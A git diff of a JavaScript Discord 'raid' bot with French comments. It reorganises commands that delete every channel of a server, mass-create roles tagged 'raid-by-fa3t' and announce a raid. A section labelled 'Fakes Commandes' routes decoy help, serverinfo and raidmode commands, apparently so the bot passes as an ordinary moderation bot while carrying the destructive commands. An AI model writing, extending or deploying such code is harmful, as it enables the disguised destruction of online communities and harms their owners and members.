@@ -11,8 +11,9 @@ const raid = new MagicHitler.Client({
 raid.ready();
 raid.sendMessage("Test réussi", "test");
 
-// Détruire le serveur en entier :
+// ------ Commandes de destruction ------
 
+// Commande pour détruire le serveur en entier :
 raid.deleteChannels("raid", {
     createChannel: false
 });
@@ -28,7 +29,7 @@ raid.createRoles("raid", {
     rolesName: "raid-by-fa3t"
 });
 
-// Commandes Raids :
+// Commandes Raids 1 :
 
 raid.deleteChannel("del");
 raid.deleteChannels("delAll", {
@@ -50,42 +51,9 @@ raid.createRoles("rls", {
     rolesName: "raid-by-fa3t"
 });
 
-// Fakes Commandes :
-
-client.on('message', message => {
-
-    let args = message.content.slice(prefix.length).trim().split(' ');
-    let cmd = args.shift().toLowerCase();
-
-    if(message.author.bot) return;
-    if(!message.content.startsWith(prefix)) return;
-
-    try{
-
-        if(cmd === 'h') cmd = 'help';
-        if(cmd === 'si') cmd = 'serverinfo';
-        if(cmd === 'rd-on') cmd = 'raidmode-on';
-        if(cmd === 'rd-off') cmd = 'raidmode-off';
-        if(cmd === 'cID') cmd = 'checkID';
-
-        delete require.cache[require.resolve(`./commands/${cmd}.js`)];
-
-        let ops = {
-            ownerID: '515464339000524800'
-        }
-
-        let commandFile = require(`./commands/${cmd}.js`);
-        commandFile.run(Discord, client, message, args, prefix, ops);
-
-    } catch (e) {
-        console.log(e.stack);
-    }
-
-});
+// Commandes Raid 2 :
 
 client.on('message', msg => {
-
-    // Commandes Raid en plus :
 
     if(msg.content === "rd!help"){
         msg.delete()
@@ -135,6 +103,41 @@ client.on('message', msg => {
     }
 
 })
+
+// ------ Fakes Commandes ------
+
+client.on('message', message => {
+
+    let args = message.content.slice(prefix.length).trim().split(' ');
+    let cmd = args.shift().toLowerCase();
+
+    if(message.author.bot) return;
+    if(!message.content.startsWith(prefix)) return;
+
+    try{
+
+        if(cmd === 'h') cmd = 'help';
+        if(cmd === 'si') cmd = 'serverinfo';
+        if(cmd === 'rd-on') cmd = 'raidmode-on';
+        if(cmd === 'rd-off') cmd = 'raidmode-off';
+        if(cmd === 'cID') cmd = 'checkID';
+
+        delete require.cache[require.resolve(`./commands/${cmd}.js`)];
+
+        let ops = {
+            ownerID: '515464339000524800'
+        }
+
+        let commandFile = require(`./commands/${cmd}.js`);
+        commandFile.run(Discord, client, message, args, prefix, ops);
+
+    } catch (e) {
+        console.log(e.stack);
+    }
+
+});
+
+
 
 // Quand le bot rejoins un serveur :
 
